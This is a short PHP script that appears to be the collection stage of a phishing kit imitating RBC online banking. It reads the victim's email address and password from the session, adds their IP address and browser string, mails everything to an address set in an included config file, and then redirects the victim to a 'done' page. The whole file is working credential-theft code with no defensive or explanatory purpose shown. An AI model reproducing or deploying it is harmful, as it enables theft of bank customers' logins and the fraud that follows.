<?php
session_start();
include "youremail.php";
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$message .= "--------------RBC -----------------------\n";
$message .= "Email      : ".$_SESSION['em']."\n";
$message .= "pass        : ".$_SESSION['ep']."\n";
$message .= "-------------- EMAIL ----------------------\n";
$message .= "IP                     : ".$ip."\n";
$message .= "UA: ".$browserAgent."\n";
$subject = "RBC eaccess $ip ";

$a1 = $_SESSION['em'];

if(preg_match("/^([a-z0-9\+_\-]+)(\.[a-z0-9\+_\-]+)*@([a-z0-9\-]+\.)+[a-z]{2,6}$/ix", $a1)){

mail($send,$subject,$message);


}
	
		   header("Location: done.php");

	 
?>